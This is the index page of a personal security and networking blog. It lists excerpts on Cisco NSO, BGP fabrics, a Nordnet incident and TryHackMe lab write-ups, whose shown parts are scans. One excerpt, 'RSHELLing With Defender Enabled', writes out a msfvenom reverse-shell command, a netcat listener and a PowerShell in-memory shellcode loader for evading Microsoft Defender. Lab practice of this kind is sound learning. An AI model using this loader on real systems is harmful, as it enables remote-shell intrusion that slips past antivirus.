<!DOCTYPE html>
<html lang="en" dir="auto">

<head>
	<meta name="generator" content="Hugo 0.140.0"><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Logs</title>

<meta name="description" content="">
<meta name="author" content="TJK">
<link rel="canonical" href="https://timo-juhani.github.io/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css" integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://timo-juhani.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://timo-juhani.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://timo-juhani.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://timo-juhani.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://timo-juhani.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" type="application/rss+xml" href="https://timo-juhani.github.io/index.xml">
<link rel="alternate" type="application/json" href="https://timo-juhani.github.io/index.json">
<link rel="alternate" hreflang="en" href="https://timo-juhani.github.io/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://timo-juhani.github.io/">
  <meta property="og:site_name" content="Logs">
  <meta property="og:title" content="Logs">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="website">
      <meta property="og:image" content="https://timo-juhani.github.io/papermod-cover.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://timo-juhani.github.io/papermod-cover.png">
<meta name="twitter:title" content="Logs">
<meta name="twitter:description" content="">

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Organization",
  "name": "Logs",
  "url": "https://timo-juhani.github.io/",
  "description": "",
  "logo": "https://timo-juhani.github.io/favicon.ico",
  "sameAs": [
      
  ]
}
</script>
</head>

<body class="list" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://timo-juhani.github.io/" accesskey="h" title="Logs (Alt + H)">Logs</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://timo-juhani.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://timo-juhani.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://timo-juhani.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main"> 
<article class="first-entry home-info">
    <header class="entry-header">
        <h1>Welcome to Logs</h1>
    </header>
    <div class="entry-content">
        Security, technology and reflections.
    </div>
    <footer class="entry-footer">
        <div class="social-icons" >
</div>

    </footer>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">BGP Based Data Center Fabric
    </h2>
  </header>
  <div class="entry-content">
    <p>Introduction CLOS fabric using VLAN based access and BGP as the fabric routing procotol. The network is shown below. All switches are Cisco Nexus 9000v. Let’s go.
Leaf Configuration Route-map All switches have been configured with tagged IP addresses. Those tags are handy when redistributing routes to BGP. The approach saves the hassle of using network clauses and prefix-maps.
route-map REDISTRIBUTION-MAP permit 10 match tag 12345 BFD Since we are talking about just BGP combined with a CLOS fabric it makes sense to enable BFD on all fabric links. This way link failures can be detected quite fast and BGP neighbors taken down to ensure fast convergence.
...</p>
  </div>
  <footer class="entry-footer"><span title='2025-02-21 09:45:59 +0200 EET'>February 21, 2025</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to BGP Based Data Center Fabric" href="https://timo-juhani.github.io/logs/bgp-based-data-center-fabric/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Phased Approach To Cisco NSO
    </h2>
  </header>
  <div class="entry-content">
    <p>First time is always the hardest. It helps if someone has already gone down the road and is ready to share their lessons learned.
Cisco NSO is a powerful network automation tool that can help network operations tremendously but is also known for a steep learning curve. This post aims to lay down an implementation pathway that enables fast wins and expands the scope gradually while avoiding overwhelming the engineering teams.
...</p>
  </div>
  <footer class="entry-footer"><span title='2025-02-12 14:09:46 +0200 EET'>February 12, 2025</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to Phased Approach To Cisco NSO" href="https://timo-juhani.github.io/logs/phased-approach-to-cisco-nso/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Nordnet Incident
    </h2>
  </header>
  <div class="entry-content">
    <p>Yesterday around noon Nordnet received first messages about ongoing technical incident. In short, users were able to see other users stock accounts momentarily. The problem component according to Nordnet was a software component in login process. The remediation was to disable that component.
Starting from the first moment the issue was reported Nordnet has 72 hours to provide a recitation to authorities explaining the incident.
Nordnet Incident Report
Lessons Something changed. System state won’t change on its own. Witnesses of privacy and security incidents should not interfere ,e.g., by sharing sreenshots via social media for the risk of themselves conducting a crime. </p>
  </div>
  <footer class="entry-footer"><span title='2025-02-12 08:05:12 +0200 EET'>February 12, 2025</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to Nordnet Incident" href="https://timo-juhani.github.io/logs/nordnet-incident/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">NSO Cheatsheet
    </h2>
  </header>
  <div class="entry-content">
    <p>The evolving summary of key NSO commands.
Installation Local # Unpack Linux binary sh nso-6.0.linux.x86_64.installer.bin --local-install ~/nso-6.0 # Create a NSO instance (local setup) source ~/nso/ncsrc # Set env variables vim .bashrc source ~/nso-5.8/ncsrc # add to .bashrc source .bashrc # Verify NSO is on path echo $PATH # Run NCS setup to create a running directory ncs-setup --dest ~/nso-run # Or with NEDs ncs-setup \ --package nso/packages/neds/cisco-ios-cli-6.91 \ --dest nso-run cd ~/nso-run NEDs NEDs are distributed as compressed tar files (.tar.gz). NEDs are Cisco NSO packages. Cisco NSO expects to find packages in the packages subdirectory of the running directory:
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-12-12 08:08:32 +0200 EET'>December 12, 2024</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to NSO Cheatsheet" href="https://timo-juhani.github.io/logs/nso-cheatsheet/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">RSHELLing With Defender Enabled
    </h2>
  </header>
  <div class="entry-content">
    <p>When Microsoft Defender is enabled a way to bypass it is to execute the shell code by loading it to the memory. I found this technique interesting and worth saving for later use.
Payload # Create payload with msfvenom msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.184.18 LPORT=4444 -f powershell Start A Listener rlwrap nc -nvlp 4444 Execute The Payload # Copy and paste directly to PowerShell # Phase 1 $VrtAlloc = @&#34; using System; using System.Runtime.InteropServices; public class VrtAlloc{ [DllImport(&#34;kernel32&#34;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); } &#34;@ Add-Type $VrtAlloc $WaitFor= @&#34; using System; using System.Runtime.InteropServices; public class WaitFor{ [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } &#34;@ Add-Type $WaitFor $CrtThread= @&#34; using System; using System.Runtime.InteropServices; public class CrtThread{ [DllImport(&#34;kernel32&#34;, CharSet=CharSet.Ansi)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); } &#34;@ Add-Type $CrtThread # Phase 2 [Byte[]] $buf = &lt;PAYLOAD-HERE&gt; # Phase 3 [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40) [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length) $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0) [WaitFor]::WaitForSingleObject($thandle, [uint32]&#34;0xFFFFFFFF&#34;) Not a novel but still a super interesting technique for me.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-12-11 08:52:49 +0200 EET'>December 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to RSHELLing With Defender Enabled" href="https://timo-juhani.github.io/logs/rshelling-with-defender-enabled/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">Cisco SDWAN and Air-Gapped ZTP Server
    </h2>
  </header>
  <div class="entry-content">
    <p>This is a short after action report covering how to deploy an air-gapped ZTP server for Cisco SDWAN.
The motivation for this log is to fill in the gaps in other documentations and provide a step by step approach how to get to the end goal.
1. Networking The networking setup is case by case. The goal is to have IP level reachability and make sure that DHCP requests find their target even if their destination is outside their LAN.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-10-04 14:11:54 +0300 EEST'>October 4, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to Cisco SDWAN and Air-Gapped ZTP Server" href="https://timo-juhani.github.io/logs/cisco-sdwan-air-gapped-ztp/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">THM: Retro
    </h2>
  </header>
  <div class="entry-content">
    <p>Initial Scans Port Scan Initial port scan showed open web and RDP ports. Based on the output below the system was detected to be a Windows host running IIS web server.
nmap -sV 10.10.214.63 Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-02 09:16 BST Nmap scan report for ip-10-10-214-63.eu-west-1.compute.internal (10.10.214.63) Host is up (0.00052s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 3389/tcp open ms-wbt-server Microsoft Terminal Services MAC Address: 02:F2:D4:2C:99:29 (Unknown) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds Web Enumeration &amp; Scan / Version: IIS httpd 10.0.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-09-02 11:15:07 +0300 EEST'>September 2, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to THM: Retro" href="https://timo-juhani.github.io/logs/thm-retro/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">THM: Mr Robot
    </h2>
  </header>
  <div class="entry-content">
    <p>Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?
Port Scan nmap -sV 10.10.198.85 Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 11:40 BST Nmap scan report for ip-10-10-198-85.eu-west-1.compute.internal (10.10.198.85) Host is up (0.00068s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd 443/tcp open ssl/http Apache httpd MAC Address: 02:64:59:2F:71:E5 (Unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.35 seconds Web Directory Scan gobuster dir -u http://10.10.198.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /images (Status: 301) /blog (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0 (Status: 301) /video (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200) /dashboard (Status: 302) /%20 (Status: 301) /wp-admin (Status: 301) /phpmyadmin (Status: 403) /0000 (Status: 301) Progress: 14808 / 220561 (6.71%) Reviewed robots.txt file which reveled the first key at /key-1-of-3.txt. Robots file also pointed to a file called /fsocity.dic which seems to be a wordlist of some sort.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-08-29 13:08:59 +0300 EEST'>August 29, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to THM: Mr Robot" href="https://timo-juhani.github.io/logs/thm-mr-robot/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">THM: Basic Pentesting
    </h2>
  </header>
  <div class="entry-content">
    <p>Port Scan nmap 10.10.29.172 # Results Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 07:20 BST Nmap scan report for ip-10-10-29-172.eu-west-1.compute.internal (10.10.29.172) Host is up (0.00089s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8009/tcp open ajp13 8080/tcp open http-proxy MAC Address: 02:9B:BD:BC:6C:57 (Unknown) Web Enumeration The homepage displays: “Undergoing maintenance”. In the source code there is a comment:
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-08-28 09:16:18 +0300 EEST'>August 28, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to THM: Basic Pentesting" href="https://timo-juhani.github.io/logs/basic-pentesting/"></a>
</article>

<article class="post-entry"> 
  <header class="entry-header">
    <h2 class="entry-hint-parent">THM: Pickle Rick
    </h2>
  </header>
  <div class="entry-content">
    <p>Task This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle
Enumeration Port Scan nmap -sV -sC 10.10.93.106 Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-16 10:26 BST Nmap scan report for ip-10-10-93-106.eu-west-1.compute.internal (10.10.93.106) Host is up (0.00026s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Rick is sup4r cool MAC Address: 02:8E:DC:DD:72:CF (Unknown) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds SSH Server Only accepts certificate based authentication.
...</p>
  </div>
  <footer class="entry-footer"><span title='2024-08-16 12:06:46 +0300 EEST'>August 16, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;TJK</footer>
  <a class="entry-link" aria-label="post link to THM: Pickle Rick" href="https://timo-juhani.github.io/logs/thm-pickle-rick/"></a>
</article>
<footer class="page-footer">
  <nav class="pagination">
    <a class="next" href="https://timo-juhani.github.io/page/2/">Next&nbsp;&nbsp;»
    </a>
  </nav>
</footer>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://timo-juhani.github.io/">Logs</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
